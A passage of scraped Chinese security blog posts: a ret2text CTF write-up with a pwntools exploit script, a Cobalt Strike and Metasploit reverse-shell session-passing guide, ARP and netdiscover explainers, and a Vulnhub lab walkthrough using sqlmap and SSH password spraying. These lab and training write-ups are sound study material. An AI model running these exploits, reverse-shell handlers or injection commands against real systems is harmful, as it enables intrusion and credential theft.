<p>cyclic 200</p>
</blockquote>
<p><img src="/images/image-20240320173041850.png" alt="image-20240320173041850"></p>
<p>​	然后运行程序至输入口，将生成的有序字符串作为 stdin 数据输入运行程序</p>
<p><img src="/images/image-20240320173123708.png" alt="image-20240320173123708"></p>
<p>​	继续运行程序，可以发现程序出错了，在0x62616164这个地址处出现错误，函数调用结束后会使用 ret 从栈中弹出一个数值作为 EIP 的数值，从而将下一条执行命令的地址修改为 EIP指向地址</p>
<p><img src="/images/image-20240320173132390.png" alt="image-20240320173132390"></p>
<p>​	然后使用 pwndbg 的 <code>cyclic -l</code>  查看在出错的字符前还有多少个字节的数据，可以看到在当前出错的数据前还有112个字符数据</p>
<blockquote>
<p>cyclic -l 0x62616164</p>
</blockquote>
<p><img src="/images/image-20240320173215041.png" alt="image-20240320173215041"></p>
<h3 id="2-2-代码审计确定偏移值"><a href="#2-2-代码审计确定偏移值" class="headerlink" title="2.2 代码审计确定偏移值"></a>2.2 代码审计确定偏移值</h3><p>​	通过 IDA 可以知道，gets 函数需要传入的参数 s 距离 esp 位置高 1C 处</p>
<p><img src="/images/image-20240320183032309.png" alt="image-20240320183032309"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:080486A7                 lea     eax, [esp+1Ch]</span><br><span class="line">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure>

<p>​	在 gdb 中运行程序，在main函数处下断点(以为发生溢出的是gets函数，而在main函数的位置处调用的gets函数，所以需要在main函数处下断点)</p>
<blockquote>
<p>pwndbg&gt; b main</p>
</blockquote>
<p>​	继续运行程序，查看 esp、ebp，如下</p>
<p><img src="/images/image-20240319095236636.png" alt="image-20240319095236636"></p>
<p>​	可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此我们可以推断</p>
<ul>
<li>s 的地址为 0xffffcd5c</li>
<li>s 相对于 ebp 的偏移为 0x6c</li>
<li>s 相对于返回地址的偏移为 0x6c+4</li>
</ul>
<h2 id="3-梳理逻辑，编写程序"><a href="#3-梳理逻辑，编写程序" class="headerlink" title="3 梳理逻辑，编写程序"></a>3 梳理逻辑，编写程序</h2><p>​	所以我们需要输入这样一串字符：</p>
<ul>
<li><p>112(0x6C + 4)个垃圾字符数据</p>
</li>
<li><p>.text:0804863A 内存地址</p>
<pre><code>最后的 payload 如下：
</code></pre>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">bash_addr = <span class="number">0x0804863A</span></span><br><span class="line">payload = <span class="string">b&#x27;c&#x27;</span> * (<span class="number">0x6C</span> + <span class="number">4</span> ) + p32(bash_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2text/" data-id="clu6lf1gt0006a2vd54itamaa" data-title="pwn-stackoverflow-ret2text" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-tools-cs-msf-exchange" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/17/tools-cs-msf-exchange/" class="article-date">
  <time class="dt-published" datetime="2024-03-17T06:26:44.000Z" itemprop="datePublished">2024-03-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/17/tools-cs-msf-exchange/">tools_cs_msf_exchange</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CS-与-MSF-之间的联动"><a href="#CS-与-MSF-之间的联动" class="headerlink" title="CS 与 MSF 之间的联动"></a>CS 与 MSF 之间的联动</h1><h2 id="1-CS-shell-反弹到-MSF-上"><a href="#1-CS-shell-反弹到-MSF-上" class="headerlink" title="1. CS shell 反弹到 MSF 上"></a>1. CS shell 反弹到 MSF 上</h2><h3 id="1-1-CS-设置联动监听器"><a href="#1-1-CS-设置联动监听器" class="headerlink" title="1.1 CS 设置联动监听器"></a>1.1 CS 设置联动监听器</h3><p>​	这里设置联动监听器， 使用的是 HTTP 通道，需要设置 HTTP 监听的域名和端口</p>
<p><img src="/images/image-20240317131321330.png" alt="image-20240317131321330"></p>
<h3 id="1-2-MSF-设置联动监听器"><a href="#1-2-MSF-设置联动监听器" class="headerlink" title="1.2 MSF 设置联动监听器"></a>1.2 MSF 设置联动监听器</h3><p>​	因为在上面我们建立的是 http 的监听器，所以在 MSF 中也需要建立 http 的反向监听器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line">lhost =&gt; 0.0.0.0</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 8080</span><br><span class="line">lport =&gt; 8080</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>

<p>​	在这里设置的 lhost 与 lport (监听地址和端口) 需要和在 CS上设置的内容一致</p>
<p><img src="/images/image-20240317131520192.png" alt="image-20240317131520192"></p>
<h3 id="1-3-CS-反弹-shell-到-MSF"><a href="#1-3-CS-反弹-shell-到-MSF" class="headerlink" title="1.3 CS 反弹 shell 到 MSF"></a>1.3 CS 反弹 shell 到 MSF</h3><p>​	将会话迁移(spawn功能，可以使用命令行，也可以使用CS图形化界面默认功能迁移)到刚刚在CS上建立的监听器上</p>
<p>​	<img src="/images/image-20240317140306170.png" alt="image-20240317140306170"></p>
<p>​	成功获取到监听会话</p>
<p><img src="/images/image-20240317131457292.png" alt="image-20240317131457292"></p>
<h2 id="2-MSF-shell-反弹到-CS-上"><a href="#2-MSF-shell-反弹到-CS-上" class="headerlink" title="2. MSF shell 反弹到 CS 上"></a>2. MSF shell 反弹到 CS 上</h2><h3 id="2-1-CS-设置联动监听器"><a href="#2-1-CS-设置联动监听器" class="headerlink" title="2.1 CS 设置联动监听器"></a>2.1 CS 设置联动监听器</h3><p>​	这里设置联动监听器， 使用的是 HTTP 通道，需要设置 HTTP 监听的域名和端口</p>
<p><img src="/images/image-20240317140723324.png" alt="image-20240317140723324"></p>
<h3 id="2-2-MSF-设置联动监听器"><a href="#2-2-MSF-设置联动监听器" class="headerlink" title="2.2 MSF 设置联动监听器"></a>2.2 MSF 设置联动监听器</h3><p>​	首先选择当前需要联动的sessions</p>
<blockquote>
<h4 id="查看所有会话"><a href="#查看所有会话" class="headerlink" title="查看所有会话"></a>查看所有会话</h4><p>sessions</p>
</blockquote>
<p>​	这里尝试将session 3 进行迁移</p>
<p><img src="/images/image-20240317134605959.png" alt="image-20240317134605959">	</p>
<p>​	因为在上面我们建立的是 http 的监听器，所以在 MSF 中也需要建立 http 的反向监听器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/local/payload_inject </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line">lhost =&gt; 0.0.0.0</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> lport 8080  </span><br><span class="line">lport =&gt; 80800</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> session 3</span><br><span class="line">session =&gt; 3</span><br><span class="line">msf6 &gt; run </span><br></pre></td></tr></table></figure>

<p>​	在这里设置的 lhost 与 lport (监听地址和端口) 需要和在 CS上设置的内容一致</p>
<p><img src="/images/image-20240317140910941.png" alt="image-20240317140910941"></p>
<h3 id="1-3-MSF-反弹-shell-到-CS"><a href="#1-3-MSF-反弹-shell-到-CS" class="headerlink" title="1.3 MSF 反弹 shell 到 CS"></a>1.3 MSF 反弹 shell 到 CS</h3><p>​	在配置完 MSF 反弹shell参数后直接运行，过会儿就能在 CS 界面上看到上线的会话了(默认上线是启动的notepad,exe)</p>
<p><img src="/images/image-20240317135236135.png" alt="image-20240317135236135"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/17/tools-cs-msf-exchange/" data-id="clu6lf1gy000ca2vdbo2q60u9" data-title="tools_cs_msf_exchange" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-protocol-arp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/15/protocol-arp/" class="article-date">
  <time class="dt-published" datetime="2024-03-15T05:49:01.000Z" itemprop="datePublished">2024-03-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/15/protocol-arp/">protocol-arp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><h2 id="0-ARP-协议基本概念"><a href="#0-ARP-协议基本概念" class="headerlink" title="0. ARP 协议基本概念"></a>0. ARP 协议基本概念</h2><p>​	地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p>
<h2 id="1-ARP-数据包格式解析"><a href="#1-ARP-数据包格式解析" class="headerlink" title="1. ARP 数据包格式解析"></a>1. ARP 数据包格式解析</h2><h3 id="1-1-以太网帧封装的ARP数据包"><a href="#1-1-以太网帧封装的ARP数据包" class="headerlink" title="1.1 以太网帧封装的ARP数据包"></a>1.1 以太网帧封装的ARP数据包</h3><p><img src="/images/image-20240315124206322.png" alt="image-20240315124206322"></p>
<p>​	ARP是个独立的三层协议，并不需要IP协议封装，而是直接生成自己的报文，到达数据链路层后，由数据链路层协议进行封装，一般是以太网协议。封装的过程，就是在ARP报文的前面加上以太网帧头，再加上4字节的冗余校验码结尾，校验码用于检验数据传输是否出现损坏。</p>
<blockquote>
<p>主要参数 :</p>
<p>​	以太网目的地址：6字节，如果是ARP请求报文，该字段为广播MAC地址(FF:FF:FF:FF:FF:FF)</p>
<p>​	以太网源地址：6字节</p>
<p>​	帧类型：2字节，0x0806表示是ARP协议</p>
<p>​	以太网帧尾： 4字节</p>
</blockquote>
<p><strong>注：以太网帧最小长度是64个字节，最长1518个字节。封装后的ARP帧，实际就是一个最小以太网帧，包含14个字节的以太网帧头，28个字节的ARP报文，4个字节的以太网帧尾，一共是46个字节，其余18个字节用0来填充，共计64个字节。</strong></p>
<h3 id="1-2-ARP-数据包报文"><a href="#1-2-ARP-数据包报文" class="headerlink" title="1.2 ARP 数据包报文"></a>1.2 ARP 数据包报文</h3><p><img src="/images/image-20240315122951442.png" alt="image-20240315122951442"></p>
<blockquote>
<p>主要参数 :</p>
<p>​	硬件类型：2字节，值为1表示以太网地址</p>
<p>​	协议类型：2字节，0x0800表示IP地址</p>
<p>​	硬件地址长度：1字节，数值为6</p>
<p>​	协议地址长度：1字节，数值为4</p>
<p>​	操作代码：2字节，1表示请求报文，2表示应答报文</p>
<p>​	源MAC地址：6字节</p>
<p>​	源IP地址：4节字</p>
<p>​	目的MAC地址：6字节	</p>
<p>·	目的IP地址：4节字</p>
</blockquote>
<h2 id="2-ARP-协议工作流程"><a href="#2-ARP-协议工作流程" class="headerlink" title="2. ARP 协议工作流程"></a>2. ARP 协议工作流程</h2><h3 id="2-1-ARP-协议工作流程原理简述"><a href="#2-1-ARP-协议工作流程原理简述" class="headerlink" title="2.1 ARP 协议工作流程原理简述"></a>2.1 ARP 协议工作流程原理简述</h3><p>​	(以下图主机A与主机C之间进行通信为例)</p>
<p><img src="/images/image-20240315125654168.png" alt="image-20240315125654168"></p>
<pre><code> 1. 主机A想要发送数据包到主机C，首先会检查**本地ARP缓存**，即ARP缓存表，搜索目标IP地址是否存在对应的MAC地址
 2. 如果ARP表中目标IP地址已有对应的MAC地址，则直接使用该地址进行数据包发送
 3. 如果ARP表中不存在目标IP地址对应的MAC地址，则向**本地网络中广播ARP请求**（ARP Request）数据包，请求其它主机回复该IP地址所对应的MAC地址
 4. 凡是收到ARP请求数据包的主机，都比较其自身拥有的IP地址和ARP请求数据包中的目标IP地址是否匹配。若匹配，则向主机A发送ARP响应（ARP Reply）数据包，其中包含其自己的MAC地址
 5. 主机A收到ARP响应数据包后，即可根据目标IP地址和对应的MAC地址进行数据包的发送
</code></pre>
<h3 id="2-2-ARP-协议工作流程实验简述"><a href="#2-2-ARP-协议工作流程实验简述" class="headerlink" title="2.2 ARP 协议工作流程实验简述"></a>2.2 ARP 协议工作流程实验简述</h3><h4 id="2-2-1-主机A在本地ARP缓存表中查找对应的MAC地址"><a href="#2-2-1-主机A在本地ARP缓存表中查找对应的MAC地址" class="headerlink" title="2.2.1 主机A在本地ARP缓存表中查找对应的MAC地址"></a>2.2.1 主机A在本地ARP缓存表中查找对应的MAC地址</h4><p><img src="/images/image-20240315125853205.png" alt="image-20240315125853205"></p>
<h4 id="2-2-2-发送请求包"><a href="#2-2-2-发送请求包" class="headerlink" title="2.2.2 发送请求包"></a>2.2.2 发送请求包</h4><p>​	主机A在ARP表中找不到对应的MAC地址，则将缓存该数据报文，然后以广播方式发送一个ARP请求报文</p>
<p><img src="/images/image-20240315130345973.png" alt="image-20240315130345973"></p>
<table>
<thead>
<tr>
<th>目的IP</th>
<th>源IP</th>
<th>目的MAC</th>
<th>源MAC</th>
<th>类型</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.0.3</td>
<td>192.168.0.1</td>
<td>FF-FF-FF-FF-FF-FF</td>
<td>54-89-98-80-72-D7</td>
<td>Request</td>
</tr>
</tbody></table>
<h4 id=""><a href="#" class="headerlink" title=""></a><img src="/images/image-20240315130905425.png" alt="image-20240315130905425"></h4><h4 id="2-2-3-接受响应包"><a href="#2-2-3-接受响应包" class="headerlink" title="2.2.3 接受响应包"></a>2.2.3 接受响应包</h4><p>​	由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机C）会对该请求进行处理</p>
<p>​	主机C比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以单播方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。</p>
<p><img src="/images/image-20240315130436795.png" alt="image-20240315130436795"></p>
<table>
<thead>
<tr>
<th>目的IP</th>
<th>源IP</th>
<th>目的MAC</th>
<th>源MAC</th>
<th>类型</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.0.1</td>
<td>192.168.0.3</td>
<td>54-89-98-80-72-D7</td>
<td>54-89-98-B7-0B-E8</td>
<td>Reply</td>
</tr>
</tbody></table>
<p><img src="/images/image-20240315130929464.png" alt="image-20240315130929464"></p>
<h4 id="2-2-4-ARP-缓存"><a href="#2-2-4-ARP-缓存" class="headerlink" title="2.2.4 ARP 缓存"></a>2.2.4 ARP 缓存</h4><p>​	为了避免重复发送ARP请求，产生大量的广播包，每台主机都有一个ARP缓存列表，当源主机得到 ARP 响应后，将目标主机的 IP 地址和物理地址存入本机 ARP 缓存中，并保留一定时间。下次请求 MAC 地址时，直接查询 ARP 缓存，而无须再发送 ARP 请求，从而节约了网络资源。当缓存生存期结束后，才会再次发送ARP请求报文。</p>
<h2 id="3-ARP-的应用场景"><a href="#3-ARP-的应用场景" class="headerlink" title="3. ARP 的应用场景"></a>3. ARP 的应用场景</h2><ul>
<li>ARP的主要应用在局域网中，用于寻找目标主机的MAC地址，以实现数据包的发送和接收</li>
<li>ARP是广泛应用在TCP&#x2F;IP协议栈中的重要协议，为网络通信提供了必要的支持</li>
<li>ARP还可以用于攻击，ARP欺骗可以伪装成另一个主机的MAC地址，欺骗路由器或其它主机发送信息</li>
</ul>
<h2 id="4-ARP-的优缺点"><a href="#4-ARP-的优缺点" class="headerlink" title="4.  ARP 的优缺点"></a>4.  ARP 的优缺点</h2><ul>
<li>ARP能在目标MAC地址未知的情况下实现数据包的发送和接收，使通信更加方便</li>
<li>ARP对网络协议和硬件无特殊要求，适用范围广泛</li>
<li>ARP有可能存在缓存污染攻击等安全风险，需要加强安全防护</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/15/protocol-arp/" data-id="clu6lf1gi0003a2vd590q7nnx" data-title="protocol-arp" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/protocol/" rel="tag">protocol</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-tools-netdiscover" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/15/tools-netdiscover/" class="article-date">
  <time class="dt-published" datetime="2024-03-15T02:38:07.000Z" itemprop="datePublished">2024-03-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/15/tools-netdiscover/">tools-netdiscover</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="工具–Netdiscover"><a href="#工具–Netdiscover" class="headerlink" title="工具–Netdiscover"></a>工具–Netdiscover</h1><h2 id="0-Netdiscover-基本概念"><a href="#0-Netdiscover-基本概念" class="headerlink" title="0. Netdiscover 基本概念"></a>0. Netdiscover 基本概念</h2><p>​	ARP 侦查工具 Netdiscover Netdiscover 是一个主动 &#x2F; 被动的 ARP 侦查工具。该工具在不使用 DHCP 的无线网络上非常有用。使用 Netdiscover 工具可以在网络上扫描 IP 地址， ARP 侦查工具 Netdiscover 检查在线主机或搜索为它们发送的 ARP 请求</p>
<h2 id="1-Netdiscover-常见参数解析"><a href="#1-Netdiscover-常见参数解析" class="headerlink" title="1. Netdiscover 常见参数解析"></a>1. Netdiscover 常见参数解析</h2><table>
<thead>
<tr>
<th>参数</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>-i device</td>
<td>网络设备，网卡的设置</td>
</tr>
<tr>
<td>-r range</td>
<td>扫描给定的IP地址范围(可以通过CIDR表示)</td>
</tr>
<tr>
<td>-l file</td>
<td>扫描包含在文件中的IP地址范围</td>
</tr>
<tr>
<td>-p passive</td>
<td>(被动扫描)不发送任何内容，只发送嗅探针</td>
</tr>
<tr>
<td>-m file</td>
<td>扫描已知MAC地址和主机名的列表</td>
</tr>
<tr>
<td>-F filter</td>
<td>自定义pcap filter表达式(默认是’arp‘)</td>
</tr>
<tr>
<td>-s time</td>
<td>每个ARP请求之间的休眠时间(ms)</td>
</tr>
<tr>
<td>-c count</td>
<td>发送每个ARP请求的次数(对于丢失数据包的网络而言)</td>
</tr>
<tr>
<td>-n node</td>
<td>用于扫描的最后一个源IP八位字节(2-253)</td>
</tr>
<tr>
<td>-d</td>
<td>忽略自动扫描和快速模式的主配置文件</td>
</tr>
<tr>
<td>-f</td>
<td>启动快速模式扫描，节省大量时间，建议使用auto</td>
</tr>
<tr>
<td>-P</td>
<td>打印结果的格式适用于另一个程序的解析，并在活动扫描后停止</td>
</tr>
<tr>
<td>-L</td>
<td>类似于-P，但在活动扫描完成后继续监听</td>
</tr>
<tr>
<td>-N</td>
<td>不打印页眉，仅当启用-P或者-L时有效</td>
</tr>
<tr>
<td>-S</td>
<td>启用每个请求之间的休眠时间抑制(硬核模式)，扫描速度很快</td>
</tr>
</tbody></table>
<h2 id="2-Netdiscover-使用"><a href="#2-Netdiscover-使用" class="headerlink" title="2. Netdiscover 使用"></a>2. Netdiscover 使用</h2><h3 id="2-1-主动发现"><a href="#2-1-主动发现" class="headerlink" title="2.1 主动发现"></a>2.1 主动发现</h3><p>​	遵循 ARP 协议</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR</span><br></pre></td></tr></table></figure>

<blockquote>
<p>netdiscover -r 192.168.70.0&#x2F;24</p>
</blockquote>
<p><img src="/images/image-20240315101411455.png" alt="image-20240315101411455"></p>
<h3 id="2-2-被动发现"><a href="#2-2-被动发现" class="headerlink" title="2.2 被动发现"></a>2.2 被动发现</h3><blockquote>
<p>netdiscover -p</p>
</blockquote>
<p><img src="/images/image-20240315103449746.png" alt="image-20240315103449746"></p>
<h3 id="2-3-扫描后停止扫描"><a href="#2-3-扫描后停止扫描" class="headerlink" title="2.3 扫描后停止扫描"></a>2.3 扫描后停止扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR -P</span><br></pre></td></tr></table></figure>

<blockquote>
<p>netdiscover -r 192.168.70.0&#x2F;24 -P</p>
</blockquote>
<p><img src="/images/image-20240315101932699.png" alt="image-20240315101932699"></p>
<h3 id="2-4-扫描后继续监听"><a href="#2-4-扫描后继续监听" class="headerlink" title="2.4 扫描后继续监听"></a>2.4 扫描后继续监听</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR -L</span><br></pre></td></tr></table></figure>

<blockquote>
<p>netdiscover -r 192.168.70.0&#x2F;24 -L</p>
</blockquote>
<p><img src="/images/image-20240315102223897.png" alt="image-20240315102223897"></p>
<h3 id="2-5-结果无页眉修饰"><a href="#2-5-结果无页眉修饰" class="headerlink" title="2.5 结果无页眉修饰"></a>2.5 结果无页眉修饰</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR -N</span><br></pre></td></tr></table></figure>

<blockquote>
<p>netdiscover -r 192.168.70.0&#x2F;24 -P -N</p>
</blockquote>
<p><img src="/images/image-20240315102529860.png" alt="image-20240315102529860"></p>
<h3 id="2-6-重复发送请求"><a href="#2-6-重复发送请求" class="headerlink" title="2.6 重复发送请求"></a>2.6 重复发送请求</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR -c [numbers]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>netdiscover -r 192.168.70.0&#x2F;24 -c 5</p>
</blockquote>
<p>​	对于每个扫描目标发送numbers次ARP请求</p>
<p><img src="/images/image-20240315102902227.png" alt="image-20240315102902227"></p>
<blockquote>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/15/tools-netdiscover/" data-id="clu6lf1gz000ea2vd3o1x92f7" data-title="tools-netdiscover" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/scanner/" rel="tag">scanner</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-vulnhub-LAMPSecurity-CTF5-external" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/" class="article-date">
  <time class="dt-published" datetime="2024-03-14T15:03:51.000Z" itemprop="datePublished">2024-03-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/">vulnhub-LAMPSecurity-CTF5-external</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[toc]</p>
<h1 id="CTF5靶机探索"><a href="#CTF5靶机探索" class="headerlink" title="CTF5靶机探索"></a>CTF5靶机探索</h1><h2 id="1-Email用户注册处存在SQL注入"><a href="#1-Email用户注册处存在SQL注入" class="headerlink" title="1. Email用户注册处存在SQL注入"></a>1. Email用户注册处存在SQL注入</h2><p>​	访问<code>http://192.168.134.152/list/</code>可以看到这是一个Phake Organization的注册界面，BurpSuite抓包发现在当前注册功能点处用明文传输，且测试后发现存在SQL注入，以下是采用sqlmap来进行验证：</p>
<p><img src="/images/image-20230322102625939.png" alt="image-20230322102625939"></p>
<p><img src="/images/image-20230322102759639.png" alt="image-20230322102759639"></p>
<h2 id="2-远程数据库链接"><a href="#2-远程数据库链接" class="headerlink" title="2. 远程数据库链接"></a>2. 远程数据库链接</h2><h3 id="2-1-通过读取配置文件获取数据库配置信息"><a href="#2-1-通过读取配置文件获取数据库配置信息" class="headerlink" title="2.1 通过读取配置文件获取数据库配置信息"></a>2.1 通过读取配置文件获取数据库配置信息</h3><p>​		默认情况下，Linux环境下站点都是搭建在<code>/var/www/html</code>文件路径下的，一般默认情况下数据库等文件的配置路径也是会存放在这个路径下，依次访问该路径下的不同文件，可以发现在<code>/var/www/html/list</code>路径下的index.php中存放了数据库的连接账号密码</p>
<p><img src="/images/image-20230322100010898.png" alt="image-20230322100010898"></p>
<p>​		上是对数据库进行远程登录</p>
<blockquote>
<p>mysql -h 192.168.134.152 -u root -p</p>
<p>输入数据库的账号、密码</p>
</blockquote>
<p><img src="/images/image-20230322100446473.png" alt="image-20230322100446473"></p>
<blockquote>
<p>在 drupal 数据库users表中获取到用户信息</p>
</blockquote>
<p>​		将密码进行md5解密，并使用crackmapexec进行SSH链接密码喷射，但是都链接失败</p>
<p><img src="/images/image-20230322100618078.png" alt="image-20230322100618078"></p>
<h3 id="2-2-通过sql注入获取登录信息"><a href="#2-2-通过sql注入获取登录信息" class="headerlink" title="2.2 通过sql注入获取登录信息"></a>2.2 通过sql注入获取登录信息</h3><blockquote>
<p>sqlmap -r register.txt –banner –password</p>
</blockquote>
<p><img src="/images/image-20240314161227649.png" alt="image-20240314161227649"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/" data-id="clu6lf1he000la2vd3jyih0wp" data-title="vulnhub-LAMPSecurity-CTF5-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-vulnhub-LAMPSecurity-CTF5-md" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/" class="article-date">
  <time class="dt-published" datetime="2024-03-14T11:03:36.000Z" itemprop="datePublished">2024-03-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/">vulnhub-LAMPSecurity-CTF5.md</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[toc]</p>
<h1 id="CTF5-靶场"><a href="#CTF5-靶场" class="headerlink" title="CTF5 靶场"></a>CTF5 靶场</h1><h2 id="0-环境配置"><a href="#0-环境配置" class="headerlink" title="0. 环境配置"></a>0. 环境配置</h2><table>
<thead>
<tr>
<th>主机</th>
<th>IP</th>
</tr>
</thead>
<tbody><tr>
<td>攻击机</td>
